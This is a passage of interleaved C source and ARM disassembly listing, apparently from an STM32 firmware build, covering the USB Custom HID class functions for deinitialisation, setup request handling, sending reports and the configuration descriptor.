 80088ac:	801a      	strh	r2, [r3, #0]
  pdev->ep_in[CUSTOMHIDInEpAdd & 0xFU].bInterval = 0U;
 80088ae:	4b2e      	ldr	r3, [pc, #184]	; (8008968 <USBD_CUSTOM_HID_DeInit+0xec>)
 80088b0:	781b      	ldrb	r3, [r3, #0]
 80088b2:	f003 020f 	and.w	r2, r3, #15
 80088b6:	6879      	ldr	r1, [r7, #4]
 80088b8:	4613      	mov	r3, r2
 80088ba:	009b      	lsls	r3, r3, #2
 80088bc:	4413      	add	r3, r2
 80088be:	009b      	lsls	r3, r3, #2
 80088c0:	440b      	add	r3, r1
 80088c2:	3326      	adds	r3, #38	; 0x26
 80088c4:	2200      	movs	r2, #0
 80088c6:	801a      	strh	r2, [r3, #0]

  /* Close CUSTOM_HID EP OUT */
  (void)USBD_LL_CloseEP(pdev, CUSTOMHIDOutEpAdd);
 80088c8:	4b28      	ldr	r3, [pc, #160]	; (800896c <USBD_CUSTOM_HID_DeInit+0xf0>)
 80088ca:	781b      	ldrb	r3, [r3, #0]
 80088cc:	4619      	mov	r1, r3
 80088ce:	6878      	ldr	r0, [r7, #4]
 80088d0:	f004 fa40 	bl	800cd54 <USBD_LL_CloseEP>
  pdev->ep_out[CUSTOMHIDOutEpAdd & 0xFU].is_used = 0U;
 80088d4:	4b25      	ldr	r3, [pc, #148]	; (800896c <USBD_CUSTOM_HID_DeInit+0xf0>)
 80088d6:	781b      	ldrb	r3, [r3, #0]
 80088d8:	f003 020f 	and.w	r2, r3, #15
 80088dc:	6879      	ldr	r1, [r7, #4]
 80088de:	4613      	mov	r3, r2
 80088e0:	009b      	lsls	r3, r3, #2
 80088e2:	4413      	add	r3, r2
 80088e4:	009b      	lsls	r3, r3, #2
 80088e6:	440b      	add	r3, r1
 80088e8:	f503 73b2 	add.w	r3, r3, #356	; 0x164
 80088ec:	2200      	movs	r2, #0
 80088ee:	801a      	strh	r2, [r3, #0]
  pdev->ep_out[CUSTOMHIDOutEpAdd & 0xFU].bInterval = 0U;
 80088f0:	4b1e      	ldr	r3, [pc, #120]	; (800896c <USBD_CUSTOM_HID_DeInit+0xf0>)
 80088f2:	781b      	ldrb	r3, [r3, #0]
 80088f4:	f003 020f 	and.w	r2, r3, #15
 80088f8:	6879      	ldr	r1, [r7, #4]
 80088fa:	4613      	mov	r3, r2
 80088fc:	009b      	lsls	r3, r3, #2
 80088fe:	4413      	add	r3, r2
 8008900:	009b      	lsls	r3, r3, #2
 8008902:	440b      	add	r3, r1
 8008904:	f503 73b3 	add.w	r3, r3, #358	; 0x166
 8008908:	2200      	movs	r2, #0
 800890a:	801a      	strh	r2, [r3, #0]

  /* Free allocated memory */
  if (pdev->pClassDataCmsit[pdev->classId] != NULL)
 800890c:	687b      	ldr	r3, [r7, #4]
 800890e:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8008912:	687b      	ldr	r3, [r7, #4]
 8008914:	32b0      	adds	r2, #176	; 0xb0
 8008916:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800891a:	2b00      	cmp	r3, #0
 800891c:	d01f      	beq.n	800895e <USBD_CUSTOM_HID_DeInit+0xe2>
  {
    ((USBD_CUSTOM_HID_ItfTypeDef *)pdev->pUserData[pdev->classId])->DeInit();
 800891e:	687b      	ldr	r3, [r7, #4]
 8008920:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 8008924:	687a      	ldr	r2, [r7, #4]
 8008926:	33b0      	adds	r3, #176	; 0xb0
 8008928:	009b      	lsls	r3, r3, #2
 800892a:	4413      	add	r3, r2
 800892c:	685b      	ldr	r3, [r3, #4]
 800892e:	689b      	ldr	r3, [r3, #8]
 8008930:	4798      	blx	r3
    USBD_free(pdev->pClassDataCmsit[pdev->classId]);
 8008932:	687b      	ldr	r3, [r7, #4]
 8008934:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8008938:	687b      	ldr	r3, [r7, #4]
 800893a:	32b0      	adds	r2, #176	; 0xb0
 800893c:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 8008940:	4618      	mov	r0, r3
 8008942:	f004 fc19 	bl	800d178 <USBD_static_free>
    pdev->pClassDataCmsit[pdev->classId] = NULL;
 8008946:	687b      	ldr	r3, [r7, #4]
 8008948:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800894c:	687b      	ldr	r3, [r7, #4]
 800894e:	32b0      	adds	r2, #176	; 0xb0
 8008950:	2100      	movs	r1, #0
 8008952:	f843 1022 	str.w	r1, [r3, r2, lsl #2]
    pdev->pClassData = NULL;
 8008956:	687b      	ldr	r3, [r7, #4]
 8008958:	2200      	movs	r2, #0
 800895a:	f8c3 22bc 	str.w	r2, [r3, #700]	; 0x2bc
  }

  return (uint8_t)USBD_OK;
 800895e:	2300      	movs	r3, #0
}
 8008960:	4618      	mov	r0, r3
 8008962:	3708      	adds	r7, #8
 8008964:	46bd      	mov	sp, r7
 8008966:	bd80      	pop	{r7, pc}
 8008968:	200000a6 	.word	0x200000a6
 800896c:	200000a7 	.word	0x200000a7

08008970 <USBD_CUSTOM_HID_Setup>:
  * @param  req: usb requests
  * @retval status
  */
static uint8_t USBD_CUSTOM_HID_Setup(USBD_HandleTypeDef *pdev,
                                     USBD_SetupReqTypedef *req)
{
 8008970:	b580      	push	{r7, lr}
 8008972:	b088      	sub	sp, #32
 8008974:	af00      	add	r7, sp, #0
 8008976:	6078      	str	r0, [r7, #4]
 8008978:	6039      	str	r1, [r7, #0]
  USBD_CUSTOM_HID_HandleTypeDef *hhid = (USBD_CUSTOM_HID_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 800897a:	687b      	ldr	r3, [r7, #4]
 800897c:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8008980:	687b      	ldr	r3, [r7, #4]
 8008982:	32b0      	adds	r2, #176	; 0xb0
 8008984:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 8008988:	613b      	str	r3, [r7, #16]
  uint16_t len = 0U;
 800898a:	2300      	movs	r3, #0
 800898c:	83fb      	strh	r3, [r7, #30]
#ifdef USBD_CUSTOMHID_CTRL_REQ_GET_REPORT_ENABLED
  uint16_t ReportLength = 0U;
#endif /* USBD_CUSTOMHID_CTRL_REQ_GET_REPORT_ENABLED */
  uint8_t  *pbuf = NULL;
 800898e:	2300      	movs	r3, #0
 8008990:	61bb      	str	r3, [r7, #24]
  uint16_t status_info = 0U;
 8008992:	2300      	movs	r3, #0
 8008994:	81fb      	strh	r3, [r7, #14]
  USBD_StatusTypeDef ret = USBD_OK;
 8008996:	2300      	movs	r3, #0
 8008998:	75fb      	strb	r3, [r7, #23]

  if (hhid == NULL)
 800899a:	693b      	ldr	r3, [r7, #16]
 800899c:	2b00      	cmp	r3, #0
 800899e:	d101      	bne.n	80089a4 <USBD_CUSTOM_HID_Setup+0x34>
  {
    return (uint8_t)USBD_FAIL;
 80089a0:	2303      	movs	r3, #3
 80089a2:	e0f8      	b.n	8008b96 <USBD_CUSTOM_HID_Setup+0x226>
  }

  switch (req->bmRequest & USB_REQ_TYPE_MASK)
 80089a4:	683b      	ldr	r3, [r7, #0]
 80089a6:	781b      	ldrb	r3, [r3, #0]
 80089a8:	f003 0360 	and.w	r3, r3, #96	; 0x60
 80089ac:	2b00      	cmp	r3, #0
 80089ae:	d056      	beq.n	8008a5e <USBD_CUSTOM_HID_Setup+0xee>
 80089b0:	2b20      	cmp	r3, #32
 80089b2:	f040 80e8 	bne.w	8008b86 <USBD_CUSTOM_HID_Setup+0x216>
  {
    case USB_REQ_TYPE_CLASS:
      switch (req->bRequest)
 80089b6:	683b      	ldr	r3, [r7, #0]
 80089b8:	785b      	ldrb	r3, [r3, #1]
 80089ba:	3b02      	subs	r3, #2
 80089bc:	2b09      	cmp	r3, #9
 80089be:	d846      	bhi.n	8008a4e <USBD_CUSTOM_HID_Setup+0xde>
 80089c0:	a201      	add	r2, pc, #4	; (adr r2, 80089c8 <USBD_CUSTOM_HID_Setup+0x58>)
 80089c2:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 80089c6:	bf00      	nop
 80089c8:	08008a21 	.word	0x08008a21
 80089cc:	080089ff 	.word	0x080089ff
 80089d0:	08008a4f 	.word	0x08008a4f
 80089d4:	08008a4f 	.word	0x08008a4f
 80089d8:	08008a4f 	.word	0x08008a4f
 80089dc:	08008a4f 	.word	0x08008a4f
 80089e0:	08008a4f 	.word	0x08008a4f
 80089e4:	08008a31 	.word	0x08008a31
 80089e8:	08008a0f 	.word	0x08008a0f
 80089ec:	080089f1 	.word	0x080089f1
      {
        case CUSTOM_HID_REQ_SET_PROTOCOL:
          hhid->Protocol = (uint8_t)(req->wValue);
 80089f0:	683b      	ldr	r3, [r7, #0]
 80089f2:	885b      	ldrh	r3, [r3, #2]
 80089f4:	b2db      	uxtb	r3, r3
 80089f6:	461a      	mov	r2, r3
 80089f8:	693b      	ldr	r3, [r7, #16]
 80089fa:	611a      	str	r2, [r3, #16]
          break;
 80089fc:	e02e      	b.n	8008a5c <USBD_CUSTOM_HID_Setup+0xec>

        case CUSTOM_HID_REQ_GET_PROTOCOL:
          (void)USBD_CtlSendData(pdev, (uint8_t *)&hhid->Protocol, 1U);
 80089fe:	693b      	ldr	r3, [r7, #16]
 8008a00:	3310      	adds	r3, #16
 8008a02:	2201      	movs	r2, #1
 8008a04:	4619      	mov	r1, r3
 8008a06:	6878      	ldr	r0, [r7, #4]
 8008a08:	f003 fd0e 	bl	800c428 <USBD_CtlSendData>
          break;
 8008a0c:	e026      	b.n	8008a5c <USBD_CUSTOM_HID_Setup+0xec>

        case CUSTOM_HID_REQ_SET_IDLE:
          hhid->IdleState = (uint8_t)(req->wValue >> 8);
 8008a0e:	683b      	ldr	r3, [r7, #0]
 8008a10:	885b      	ldrh	r3, [r3, #2]
 8008a12:	0a1b      	lsrs	r3, r3, #8
 8008a14:	b29b      	uxth	r3, r3
 8008a16:	b2db      	uxtb	r3, r3
 8008a18:	461a      	mov	r2, r3
 8008a1a:	693b      	ldr	r3, [r7, #16]
 8008a1c:	615a      	str	r2, [r3, #20]
          break;
 8008a1e:	e01d      	b.n	8008a5c <USBD_CUSTOM_HID_Setup+0xec>

        case CUSTOM_HID_REQ_GET_IDLE:
          (void)USBD_CtlSendData(pdev, (uint8_t *)&hhid->IdleState, 1U);
 8008a20:	693b      	ldr	r3, [r7, #16]
 8008a22:	3314      	adds	r3, #20
 8008a24:	2201      	movs	r2, #1
 8008a26:	4619      	mov	r1, r3
 8008a28:	6878      	ldr	r0, [r7, #4]
 8008a2a:	f003 fcfd 	bl	800c428 <USBD_CtlSendData>
          break;
 8008a2e:	e015      	b.n	8008a5c <USBD_CUSTOM_HID_Setup+0xec>
            ((USBD_CUSTOM_HID_ItfTypeDef *)pdev->pUserData[pdev->classId])->CtrlReqComplete(req->bRequest,
                                                                                            req->wLength);
          }
#endif /* USBD_CUSTOMHID_CTRL_REQ_COMPLETE_CALLBACK_ENABLED */
#ifndef USBD_CUSTOMHID_EP0_OUT_PREPARE_RECEIVE_DISABLED
          hhid->IsReportAvailable = 1U;
 8008a30:	693b      	ldr	r3, [r7, #16]
 8008a32:	2201      	movs	r2, #1
 8008a34:	61da      	str	r2, [r3, #28]
          (void)USBD_CtlPrepareRx(pdev, hhid->Report_buf,
 8008a36:	6939      	ldr	r1, [r7, #16]
                                  MIN(req->wLength, USBD_CUSTOMHID_OUTREPORT_BUF_SIZE));
 8008a38:	683b      	ldr	r3, [r7, #0]
 8008a3a:	88db      	ldrh	r3, [r3, #6]
 8008a3c:	2b0f      	cmp	r3, #15
 8008a3e:	bf28      	it	cs
 8008a40:	230f      	movcs	r3, #15
 8008a42:	b29b      	uxth	r3, r3
          (void)USBD_CtlPrepareRx(pdev, hhid->Report_buf,
 8008a44:	461a      	mov	r2, r3
 8008a46:	6878      	ldr	r0, [r7, #4]
 8008a48:	f003 fd1a 	bl	800c480 <USBD_CtlPrepareRx>
#endif /* USBD_CUSTOMHID_EP0_OUT_PREPARE_RECEIVE_DISABLED */
          break;
 8008a4c:	e006      	b.n	8008a5c <USBD_CUSTOM_HID_Setup+0xec>
          }
          break;
#endif /* USBD_CUSTOMHID_CTRL_REQ_GET_REPORT_ENABLED */

        default:
          USBD_CtlError(pdev, req);
 8008a4e:	6839      	ldr	r1, [r7, #0]
 8008a50:	6878      	ldr	r0, [r7, #4]
 8008a52:	f003 fc78 	bl	800c346 <USBD_CtlError>
          ret = USBD_FAIL;
 8008a56:	2303      	movs	r3, #3
 8008a58:	75fb      	strb	r3, [r7, #23]
          break;
 8008a5a:	bf00      	nop
      }
      break;
 8008a5c:	e09a      	b.n	8008b94 <USBD_CUSTOM_HID_Setup+0x224>

    case USB_REQ_TYPE_STANDARD:
      switch (req->bRequest)
 8008a5e:	683b      	ldr	r3, [r7, #0]
 8008a60:	785b      	ldrb	r3, [r3, #1]
 8008a62:	2b0b      	cmp	r3, #11
 8008a64:	f200 8086 	bhi.w	8008b74 <USBD_CUSTOM_HID_Setup+0x204>
 8008a68:	a201      	add	r2, pc, #4	; (adr r2, 8008a70 <USBD_CUSTOM_HID_Setup+0x100>)
 8008a6a:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 8008a6e:	bf00      	nop
 8008a70:	08008aa1 	.word	0x08008aa1
 8008a74:	08008b83 	.word	0x08008b83
 8008a78:	08008b75 	.word	0x08008b75
 8008a7c:	08008b75 	.word	0x08008b75
 8008a80:	08008b75 	.word	0x08008b75
 8008a84:	08008b75 	.word	0x08008b75
 8008a88:	08008acb 	.word	0x08008acb
 8008a8c:	08008b75 	.word	0x08008b75
 8008a90:	08008b75 	.word	0x08008b75
 8008a94:	08008b75 	.word	0x08008b75
 8008a98:	08008b23 	.word	0x08008b23
 8008a9c:	08008b4d 	.word	0x08008b4d
      {
        case USB_REQ_GET_STATUS:
          if (pdev->dev_state == USBD_STATE_CONFIGURED)
 8008aa0:	687b      	ldr	r3, [r7, #4]
 8008aa2:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 8008aa6:	b2db      	uxtb	r3, r3
 8008aa8:	2b03      	cmp	r3, #3
 8008aaa:	d107      	bne.n	8008abc <USBD_CUSTOM_HID_Setup+0x14c>
          {
            (void)USBD_CtlSendData(pdev, (uint8_t *)&status_info, 2U);
 8008aac:	f107 030e 	add.w	r3, r7, #14
 8008ab0:	2202      	movs	r2, #2
 8008ab2:	4619      	mov	r1, r3
 8008ab4:	6878      	ldr	r0, [r7, #4]
 8008ab6:	f003 fcb7 	bl	800c428 <USBD_CtlSendData>
          else
          {
            USBD_CtlError(pdev, req);
            ret = USBD_FAIL;
          }
          break;
 8008aba:	e063      	b.n	8008b84 <USBD_CUSTOM_HID_Setup+0x214>
            USBD_CtlError(pdev, req);
 8008abc:	6839      	ldr	r1, [r7, #0]
 8008abe:	6878      	ldr	r0, [r7, #4]
 8008ac0:	f003 fc41 	bl	800c346 <USBD_CtlError>
            ret = USBD_FAIL;
 8008ac4:	2303      	movs	r3, #3
 8008ac6:	75fb      	strb	r3, [r7, #23]
          break;
 8008ac8:	e05c      	b.n	8008b84 <USBD_CUSTOM_HID_Setup+0x214>

        case USB_REQ_GET_DESCRIPTOR:
          if ((req->wValue >> 8) == CUSTOM_HID_REPORT_DESC)
 8008aca:	683b      	ldr	r3, [r7, #0]
 8008acc:	885b      	ldrh	r3, [r3, #2]
 8008ace:	0a1b      	lsrs	r3, r3, #8
 8008ad0:	b29b      	uxth	r3, r3
 8008ad2:	2b22      	cmp	r3, #34	; 0x22
 8008ad4:	d110      	bne.n	8008af8 <USBD_CUSTOM_HID_Setup+0x188>
          {
            len = MIN(USBD_CUSTOM_HID_REPORT_DESC_SIZE, req->wLength);
 8008ad6:	683b      	ldr	r3, [r7, #0]
 8008ad8:	88db      	ldrh	r3, [r3, #6]
 8008ada:	2b49      	cmp	r3, #73	; 0x49
 8008adc:	bf28      	it	cs
 8008ade:	2349      	movcs	r3, #73	; 0x49
 8008ae0:	83fb      	strh	r3, [r7, #30]
            pbuf = ((USBD_CUSTOM_HID_ItfTypeDef *)pdev->pUserData[pdev->classId])->pReport;
 8008ae2:	687b      	ldr	r3, [r7, #4]
 8008ae4:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 8008ae8:	687a      	ldr	r2, [r7, #4]
 8008aea:	33b0      	adds	r3, #176	; 0xb0
 8008aec:	009b      	lsls	r3, r3, #2
 8008aee:	4413      	add	r3, r2
 8008af0:	685b      	ldr	r3, [r3, #4]
 8008af2:	681b      	ldr	r3, [r3, #0]
 8008af4:	61bb      	str	r3, [r7, #24]
 8008af6:	e00d      	b.n	8008b14 <USBD_CUSTOM_HID_Setup+0x1a4>
          }
          else
          {
            if ((req->wValue >> 8) == CUSTOM_HID_DESCRIPTOR_TYPE)
 8008af8:	683b      	ldr	r3, [r7, #0]
 8008afa:	885b      	ldrh	r3, [r3, #2]
 8008afc:	0a1b      	lsrs	r3, r3, #8
 8008afe:	b29b      	uxth	r3, r3
 8008b00:	2b21      	cmp	r3, #33	; 0x21
 8008b02:	d107      	bne.n	8008b14 <USBD_CUSTOM_HID_Setup+0x1a4>
            {
              pbuf = USBD_CUSTOM_HID_Desc;
 8008b04:	4b26      	ldr	r3, [pc, #152]	; (8008ba0 <USBD_CUSTOM_HID_Setup+0x230>)
 8008b06:	61bb      	str	r3, [r7, #24]
              len = MIN(USB_CUSTOM_HID_DESC_SIZ, req->wLength);
 8008b08:	683b      	ldr	r3, [r7, #0]
 8008b0a:	88db      	ldrh	r3, [r3, #6]
 8008b0c:	2b09      	cmp	r3, #9
 8008b0e:	bf28      	it	cs
 8008b10:	2309      	movcs	r3, #9
 8008b12:	83fb      	strh	r3, [r7, #30]
            }
          }

          (void)USBD_CtlSendData(pdev, pbuf, len);
 8008b14:	8bfb      	ldrh	r3, [r7, #30]
 8008b16:	461a      	mov	r2, r3
 8008b18:	69b9      	ldr	r1, [r7, #24]
 8008b1a:	6878      	ldr	r0, [r7, #4]
 8008b1c:	f003 fc84 	bl	800c428 <USBD_CtlSendData>
          break;
 8008b20:	e030      	b.n	8008b84 <USBD_CUSTOM_HID_Setup+0x214>

        case USB_REQ_GET_INTERFACE:
          if (pdev->dev_state == USBD_STATE_CONFIGURED)
 8008b22:	687b      	ldr	r3, [r7, #4]
 8008b24:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 8008b28:	b2db      	uxtb	r3, r3
 8008b2a:	2b03      	cmp	r3, #3
 8008b2c:	d107      	bne.n	8008b3e <USBD_CUSTOM_HID_Setup+0x1ce>
          {
            (void)USBD_CtlSendData(pdev, (uint8_t *)&hhid->AltSetting, 1U);
 8008b2e:	693b      	ldr	r3, [r7, #16]
 8008b30:	3318      	adds	r3, #24
 8008b32:	2201      	movs	r2, #1
 8008b34:	4619      	mov	r1, r3
 8008b36:	6878      	ldr	r0, [r7, #4]
 8008b38:	f003 fc76 	bl	800c428 <USBD_CtlSendData>
          else
          {
            USBD_CtlError(pdev, req);
            ret = USBD_FAIL;
          }
          break;
 8008b3c:	e022      	b.n	8008b84 <USBD_CUSTOM_HID_Setup+0x214>
            USBD_CtlError(pdev, req);
 8008b3e:	6839      	ldr	r1, [r7, #0]
 8008b40:	6878      	ldr	r0, [r7, #4]
 8008b42:	f003 fc00 	bl	800c346 <USBD_CtlError>
            ret = USBD_FAIL;
 8008b46:	2303      	movs	r3, #3
 8008b48:	75fb      	strb	r3, [r7, #23]
          break;
 8008b4a:	e01b      	b.n	8008b84 <USBD_CUSTOM_HID_Setup+0x214>

        case USB_REQ_SET_INTERFACE:
          if (pdev->dev_state == USBD_STATE_CONFIGURED)
 8008b4c:	687b      	ldr	r3, [r7, #4]
 8008b4e:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 8008b52:	b2db      	uxtb	r3, r3
 8008b54:	2b03      	cmp	r3, #3
 8008b56:	d106      	bne.n	8008b66 <USBD_CUSTOM_HID_Setup+0x1f6>
          {
            hhid->AltSetting = (uint8_t)(req->wValue);
 8008b58:	683b      	ldr	r3, [r7, #0]
 8008b5a:	885b      	ldrh	r3, [r3, #2]
 8008b5c:	b2db      	uxtb	r3, r3
 8008b5e:	461a      	mov	r2, r3
 8008b60:	693b      	ldr	r3, [r7, #16]
 8008b62:	619a      	str	r2, [r3, #24]
          else
          {
            USBD_CtlError(pdev, req);
            ret = USBD_FAIL;
          }
          break;
 8008b64:	e00e      	b.n	8008b84 <USBD_CUSTOM_HID_Setup+0x214>
            USBD_CtlError(pdev, req);
 8008b66:	6839      	ldr	r1, [r7, #0]
 8008b68:	6878      	ldr	r0, [r7, #4]
 8008b6a:	f003 fbec 	bl	800c346 <USBD_CtlError>
            ret = USBD_FAIL;
 8008b6e:	2303      	movs	r3, #3
 8008b70:	75fb      	strb	r3, [r7, #23]
          break;
 8008b72:	e007      	b.n	8008b84 <USBD_CUSTOM_HID_Setup+0x214>

        case USB_REQ_CLEAR_FEATURE:
          break;

        default:
          USBD_CtlError(pdev, req);
 8008b74:	6839      	ldr	r1, [r7, #0]
 8008b76:	6878      	ldr	r0, [r7, #4]
 8008b78:	f003 fbe5 	bl	800c346 <USBD_CtlError>
          ret = USBD_FAIL;
 8008b7c:	2303      	movs	r3, #3
 8008b7e:	75fb      	strb	r3, [r7, #23]
          break;
 8008b80:	e000      	b.n	8008b84 <USBD_CUSTOM_HID_Setup+0x214>
          break;
 8008b82:	bf00      	nop
      }
      break;
 8008b84:	e006      	b.n	8008b94 <USBD_CUSTOM_HID_Setup+0x224>

    default:
      USBD_CtlError(pdev, req);
 8008b86:	6839      	ldr	r1, [r7, #0]
 8008b88:	6878      	ldr	r0, [r7, #4]
 8008b8a:	f003 fbdc 	bl	800c346 <USBD_CtlError>
      ret = USBD_FAIL;
 8008b8e:	2303      	movs	r3, #3
 8008b90:	75fb      	strb	r3, [r7, #23]
      break;
 8008b92:	bf00      	nop
  }
  return (uint8_t)ret;
 8008b94:	7dfb      	ldrb	r3, [r7, #23]
}
 8008b96:	4618      	mov	r0, r3
 8008b98:	3720      	adds	r7, #32
 8008b9a:	46bd      	mov	sp, r7
 8008b9c:	bd80      	pop	{r7, pc}
 8008b9e:	bf00      	nop
 8008ba0:	20000090 	.word	0x20000090

08008ba4 <USBD_CUSTOM_HID_SendReport>:
{
  USBD_CUSTOM_HID_HandleTypeDef *hhid = (USBD_CUSTOM_HID_HandleTypeDef *)pdev->pClassDataCmsit[ClassId];
#else
uint8_t USBD_CUSTOM_HID_SendReport(USBD_HandleTypeDef *pdev,
                                   uint8_t *report, uint16_t len)
{
 8008ba4:	b580      	push	{r7, lr}
 8008ba6:	b086      	sub	sp, #24
 8008ba8:	af00      	add	r7, sp, #0
 8008baa:	60f8      	str	r0, [r7, #12]
 8008bac:	60b9      	str	r1, [r7, #8]
 8008bae:	4613      	mov	r3, r2
 8008bb0:	80fb      	strh	r3, [r7, #6]
  USBD_CUSTOM_HID_HandleTypeDef *hhid = (USBD_CUSTOM_HID_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 8008bb2:	68fb      	ldr	r3, [r7, #12]
 8008bb4:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8008bb8:	68fb      	ldr	r3, [r7, #12]
 8008bba:	32b0      	adds	r2, #176	; 0xb0
 8008bbc:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 8008bc0:	617b      	str	r3, [r7, #20]
#endif /* USE_USBD_COMPOSITE */

  if (hhid == NULL)
 8008bc2:	697b      	ldr	r3, [r7, #20]
 8008bc4:	2b00      	cmp	r3, #0
 8008bc6:	d101      	bne.n	8008bcc <USBD_CUSTOM_HID_SendReport+0x28>
  {
    return (uint8_t)USBD_FAIL;
 8008bc8:	2303      	movs	r3, #3
 8008bca:	e019      	b.n	8008c00 <USBD_CUSTOM_HID_SendReport+0x5c>
#ifdef USE_USBD_COMPOSITE
  /* Get Endpoint IN address allocated for this class instance */
  CUSTOMHIDInEpAdd = USBD_CoreGetEPAdd(pdev, USBD_EP_IN, USBD_EP_TYPE_INTR, ClassId);
#endif /* USE_USBD_COMPOSITE */

  if (pdev->dev_state == USBD_STATE_CONFIGURED)
 8008bcc:	68fb      	ldr	r3, [r7, #12]
 8008bce:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 8008bd2:	b2db      	uxtb	r3, r3
 8008bd4:	2b03      	cmp	r3, #3
 8008bd6:	d112      	bne.n	8008bfe <USBD_CUSTOM_HID_SendReport+0x5a>
  {
    if (hhid->state == CUSTOM_HID_IDLE)
 8008bd8:	697b      	ldr	r3, [r7, #20]
 8008bda:	f893 3020 	ldrb.w	r3, [r3, #32]
 8008bde:	2b00      	cmp	r3, #0
 8008be0:	d10b      	bne.n	8008bfa <USBD_CUSTOM_HID_SendReport+0x56>
    {
      hhid->state = CUSTOM_HID_BUSY;
 8008be2:	697b      	ldr	r3, [r7, #20]
 8008be4:	2201      	movs	r2, #1
 8008be6:	f883 2020 	strb.w	r2, [r3, #32]
      (void)USBD_LL_Transmit(pdev, CUSTOMHIDInEpAdd, report, len);
 8008bea:	4b07      	ldr	r3, [pc, #28]	; (8008c08 <USBD_CUSTOM_HID_SendReport+0x64>)
 8008bec:	7819      	ldrb	r1, [r3, #0]
 8008bee:	88fb      	ldrh	r3, [r7, #6]
 8008bf0:	68ba      	ldr	r2, [r7, #8]
 8008bf2:	68f8      	ldr	r0, [r7, #12]
 8008bf4:	f004 f9ea 	bl	800cfcc <USBD_LL_Transmit>
 8008bf8:	e001      	b.n	8008bfe <USBD_CUSTOM_HID_SendReport+0x5a>
    }
    else
    {
      return (uint8_t)USBD_BUSY;
 8008bfa:	2301      	movs	r3, #1
 8008bfc:	e000      	b.n	8008c00 <USBD_CUSTOM_HID_SendReport+0x5c>
    }
  }
  return (uint8_t)USBD_OK;
 8008bfe:	2300      	movs	r3, #0
}
 8008c00:	4618      	mov	r0, r3
 8008c02:	3718      	adds	r7, #24
 8008c04:	46bd      	mov	sp, r7
 8008c06:	bd80      	pop	{r7, pc}
 8008c08:	200000a6 	.word	0x200000a6

08008c0c <USBD_CUSTOM_HID_GetFSCfgDesc>:
  * @param  speed : current device speed
  * @param  length : pointer data length
  * @retval pointer to descriptor buffer
  */
static uint8_t *USBD_CUSTOM_HID_GetFSCfgDesc(uint16_t *length)
{
 8008c0c:	b580      	push	{r7, lr}
 8008c0e:	b084      	sub	sp, #16
 8008c10:	af00      	add	r7, sp, #0
 8008c12:	6078      	str	r0, [r7, #4]
  USBD_EpDescTypeDef *pEpInDesc = USBD_GetEpDesc(USBD_CUSTOM_HID_CfgDesc, CUSTOM_HID_EPIN_ADDR);
 8008c14:	2181      	movs	r1, #129	; 0x81
 8008c16:	4815      	ldr	r0, [pc, #84]	; (8008c6c <USBD_CUSTOM_HID_GetFSCfgDesc+0x60>)
 8008c18:	f002 fd32 	bl	800b680 <USBD_GetEpDesc>
 8008c1c:	60f8      	str	r0, [r7, #12]
  USBD_EpDescTypeDef *pEpOutDesc = USBD_GetEpDesc(USBD_CUSTOM_HID_CfgDesc, CUSTOM_HID_EPOUT_ADDR);
 8008c1e:	2101      	movs	r1, #1
 8008c20:	4812      	ldr	r0, [pc, #72]	; (8008c6c <USBD_CUSTOM_HID_GetFSCfgDesc+0x60>)
 8008c22:	f002 fd2d 	bl	800b680 <USBD_GetEpDesc>
 8008c26:	60b8      	str	r0, [r7, #8]

  if (pEpInDesc != NULL)
 8008c28:	68fb      	ldr	r3, [r7, #12]
 8008c2a:	2b00      	cmp	r3, #0
 8008c2c:	d009      	beq.n	8008c42 <USBD_CUSTOM_HID_GetFSCfgDesc+0x36>
  {
    pEpInDesc->wMaxPacketSize = CUSTOM_HID_EPIN_SIZE;
 8008c2e:	68fb      	ldr	r3, [r7, #12]
 8008c30:	2200      	movs	r2, #0
 8008c32:	f042 0202 	orr.w	r2, r2, #2
 8008c36:	711a      	strb	r2, [r3, #4]
 8008c38:	2200      	movs	r2, #0
 8008c3a:	715a      	strb	r2, [r3, #5]
    pEpInDesc->bInterval = CUSTOM_HID_FS_BINTERVAL;
 8008c3c:	68fb      	ldr	r3, [r7, #12]
 8008c3e:	2205      	movs	r2, #5
 8008c40:	719a      	strb	r2, [r3, #6]
  }

  if (pEpOutDesc != NULL)
 8008c42:	68bb      	ldr	r3, [r7, #8]
 8008c44:	2b00      	cmp	r3, #0
 8008c46:	d009      	beq.n	8008c5c <USBD_CUSTOM_HID_GetFSCfgDesc+0x50>
  {
    pEpOutDesc->wMaxPacketSize = CUSTOM_HID_EPOUT_SIZE;
 8008c48:	68bb      	ldr	r3, [r7, #8]
 8008c4a:	2200      	movs	r2, #0
 8008c4c:	f042 0202 	orr.w	r2, r2, #2
 8008c50:	711a      	strb	r2, [r3, #4]
 8008c52:	2200      	movs	r2, #0
 8008c54:	715a      	strb	r2, [r3, #5]
    pEpOutDesc->bInterval = CUSTOM_HID_FS_BINTERVAL;
 8008c56:	68bb      	ldr	r3, [r7, #8]
 8008c58:	2205      	movs	r2, #5
 8008c5a:	719a      	strb	r2, [r3, #6]
  }

  *length = (uint16_t)sizeof(USBD_CUSTOM_HID_CfgDesc);
 8008c5c:	687b      	ldr	r3, [r7, #4]
 8008c5e:	2229      	movs	r2, #41	; 0x29
 8008c60:	801a      	strh	r2, [r3, #0]
  return USBD_CUSTOM_HID_CfgDesc;
 8008c62:	4b02      	ldr	r3, [pc, #8]	; (8008c6c <USBD_CUSTOM_HID_GetFSCfgDesc+0x60>)
}
 8008c64:	4618      	mov	r0, r3
 8008c66:	3710      	adds	r7, #16
